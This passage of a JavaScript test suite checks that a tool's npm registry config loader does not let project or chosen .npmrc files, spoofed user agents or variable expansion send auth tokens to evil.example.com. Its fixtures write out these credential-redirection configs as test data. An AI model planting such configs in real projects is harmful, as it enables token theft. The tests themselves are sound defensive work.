  const { warnings } = await loadNpmRegistryOptions(context);
  assert.ok(
    warnings.some((warning) =>
      warning.endsWith("Calavera uses the HTTP_PROXY environment variable instead."),
    ),
  );
});

const SENTINEL = "SENTINELSECRET0123456789";

/**
 * Whether any option names the host or carries the sentinel. Only the verdict is reported, never
 * the options, which hold credentials.
 * @param {Record<string, string>} options
 */
function leaks(options, host = "evil.example.com") {
  return Object.entries(options).some(
    ([key, value]) => key.includes(host) || String(value).includes(SENTINEL),
  );
}

/**
 * An account home folder with a real-user .npmrc that holds a fake token for registry.example.com.
 * @param {string} directory
 */
async function accountHomeWithToken(directory) {
  const accountHome = join(directory, "account-home");
  await mkdir(accountHome, { recursive: true });
  await writeFile(
    join(accountHome, ".npmrc"),
    "//registry.example.com/:_authToken=fake-account-token\n",
  );
  return accountHome;
}

test("invariant 2: under a package manager, credentials come only from the account's ~/.npmrc, not a chosen userconfig", async () => {
  const context = await fixture({
    user: `//evil.example.com/:_authToken=\${SENTINEL_SECRET}\nregistry=https://evil.example.com/\n`,
    env: { npm_command: "exec", SENTINEL_SECRET: SENTINEL },
  });
  const accountHome = await accountHomeWithToken(context.directory);
  const { options, warnings } = await loadNpmRegistryOptions({ ...context, accountHome });
  assert.equal(leaks(options), false);
  assert.equal(options["//registry.example.com/:_authToken"], "fake-account-token");
  assert.ok(warnings.some((warning) => warning.includes("//evil.example.com/:_authToken")));
  assert.doesNotMatch(inspect(warnings), new RegExp(SENTINEL));
});

test("invariant 2: a project .npmrc userconfig cannot bring in credentials under npm exec", async () => {
  const directory = await temporaryDirectory("calavera-npm-config-invariant-");
  const cwd = join(directory, "repo");
  await mkdir(cwd);
  const evil = join(cwd, "evil.npmrc");
  await writeFile(evil, `//evil.example.com/:_authToken=\${SENTINEL_SECRET}\n`);
  await writeFile(join(cwd, ".npmrc"), "userconfig=./evil.npmrc\n");
  const accountHome = await accountHomeWithToken(directory);
  const { options } = await loadNpmRegistryOptions({
    cwd,
    scope: SCOPE,
    accountHome,
    env: {
      HOME: join(directory, "home"),
      SENTINEL_SECRET: SENTINEL,
      npm_command: "exec",
      npm_config_local_prefix: cwd,
      npm_config_userconfig: evil,
    },
  });
  assert.equal(leaks(options), false);
  assert.equal(options["//registry.example.com/:_authToken"], "fake-account-token");
});

test("invariant 2: spoofed user agents do not let project or chosen files supply credentials", async () => {
  // pnpm exports a pnpm-workspace.yaml userAgent as npm_config_user_agent without a local prefix.
  const pnpmSpoof = await fixture({
    project: "//evil.example.com/:_authToken=literal-project-token\n",
    env: { npm_lifecycle_event: "probe", npm_config_user_agent: "bun/1.3.9 npm/? node/v24" },
  });
  const pnpmHome = await accountHomeWithToken(pnpmSpoof.directory);
  assert.equal(
    leaks((await loadNpmRegistryOptions({ ...pnpmSpoof, accountHome: pnpmHome })).options),
    false,
  );

  // A workspace-root .npmrc user-agent, run from a member.
  const member = await npmExecFromBelowRoot({
    npmrc:
      "user-agent=yarn/4.9.1 npm/? node/v24\n//evil.example.com/:_authToken=literal-root-token\n",
    member: "packages/web",
    rootPackage: { name: "repo", workspaces: ["packages/*"] },
    memberPackage: { name: "web" },
    exported: { npm_config_user_agent: "yarn/4.9.1 npm/? node/v24" },
  });
  const memberHome = await accountHomeWithToken(join(member.cwd, "..", ".."));
  assert.equal(
    leaks((await loadNpmRegistryOptions({ ...member, accountHome: memberHome })).options),
    false,
  );

  // A user-agent in a chosen user file.
  const chosen = await fixture({
    user: `user-agent=bun/1.3.9\n//evil.example.com/:_authToken=\${SENTINEL_SECRET}\n`,
    env: { npm_command: "exec", npm_config_user_agent: "bun/1.3.9", SENTINEL_SECRET: SENTINEL },
  });
  const chosenHome = await accountHomeWithToken(chosen.directory);
  assert.equal(
    leaks((await loadNpmRegistryOptions({ ...chosen, accountHome: chosenHome })).options),
    false,
  );
});

test("outside a package manager, the userconfig the caller names still supplies credentials", async () => {
  const context = await fixture({ user: "//registry.example.com/:_authToken=from-userconfig\n" });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options["//registry.example.com/:_authToken"], "from-userconfig");
});

test("invariant 1: requestOptions removes every credential for a plain-http URL and keeps them for https", async () => {
  const options = {
    registry: "https://registry.example.com/",
    "//registry.example.com/:_authToken": "fake-token",
    "//registry.example.com/:username": "me",
    "//registry.example.com/:_password": "cGFzcw==",
    "//registry.example.com/:_auth": "bWU6cGFzcw==",
    "//registry.example.com/:certfile": "/cert.pem",
    "//registry.example.com/:keyfile": "/key.pem",
    httpsProxy: "http://proxy.example.com/",
  };
  const http = requestOptions(options, "http://registry.example.com/pkg/-/pkg-1.0.0.tgz");
  assert.deepEqual(Object.keys(http).sort(), ["httpsProxy", "registry"]);
  assert.deepEqual(requestOptions(options, "https://registry.example.com/pkg"), options);
});

test("invariant 1: a registry.npmjs.org tarball that pacote rewrites onto an http registry loses its credentials", async () => {
  const options = {
    registry: "http://mirror.example.com/",
    "//registry.npmjs.org/:_authToken": "fake-npmjs-token",
    "//mirror.example.com/:_authToken": "fake-mirror-token",
  };
  const url = pacoteTarballUrl("https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz", options);
  assert.equal(url, "http://mirror.example.com/pkg/-/pkg-1.0.0.tgz");
  assert.deepEqual(Object.keys(requestOptions(options, url)), ["registry"]);
  // A tarball on another host is fetched as written.
  assert.equal(
    pacoteTarballUrl("https://cdn.example.com/pkg-1.0.0.tgz", options),
    "https://cdn.example.com/pkg-1.0.0.tgz",
  );
});

test("invariant 2: a Yarn 4 bin or exec start, which sets no lifecycle variable, still locks credentials", async () => {
  const context = await fixture({
    user: `//evil.example.com/:_authToken=\${SENTINEL_SECRET}\n`,
    env: {
      SENTINEL_SECRET: SENTINEL,
      npm_config_user_agent: "yarn/4.18.1 npm/? node/v24.3.0 darwin arm64",
      npm_execpath: "/usr/local/lib/node_modules/yarn/bin/yarn.js",
    },
  });
  const accountHome = await accountHomeWithToken(context.directory);
  const { options } = await loadNpmRegistryOptions({ ...context, accountHome });
  assert.equal(leaks(options), false);
});

test("invariant 2: a variable in a credential key of ~/.npmrc is not expanded under a package manager", async () => {
  const context = await fixture({ env: { npm_command: "exec", TOKEN_HOST: "evil.example.com" } });
  const accountHome = join(context.directory, "account-home");
  await mkdir(accountHome);
  await writeFile(join(accountHome, ".npmrc"), "//${TOKEN_HOST}/:_authToken=fake-account-token\n");
  const { options, warnings } = await loadNpmRegistryOptions({ ...context, accountHome });
  assert.equal(leaks(options), false);
  assert.ok(warnings.some((warning) => warning.includes("//${TOKEN_HOST}/:_authToken")));
});

test("invariant 2: when the account home folder is unknown, every credential is ignored and the warning says why", async () => {
  const context = await fixture({
    user: "//registry.example.com/:_authToken=fake-token\n",
    env: { npm_command: "exec" },
  });
  const { options, warnings } = await loadNpmRegistryOptions({ ...context, accountHome: "" });
  assert.equal(options["//registry.example.com/:_authToken"], undefined);
  assert.match(warnings[0], /the home folder of the operating system account is unknown/);
});

test("invariant 2: a key that becomes a credential key only after expansion is ignored under a package manager", async () => {
  const context = await fixture({
    user: `//evil.example.com/:\${TOKEN_NAME}=\${SENTINEL_SECRET}\n\${WHOLE_KEY}=\${SENTINEL_SECRET}\n`,
    env: {
      npm_config_user_agent: "yarn/4.18.1 npm/? node/v24.3.0",
      TOKEN_NAME: "_authToken",
      WHOLE_KEY: "//evil2.example.com/:_authToken",
      SENTINEL_SECRET: SENTINEL,
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(leaks(options), false);
  assert.equal(leaks(options, "evil2.example.com"), false);
});
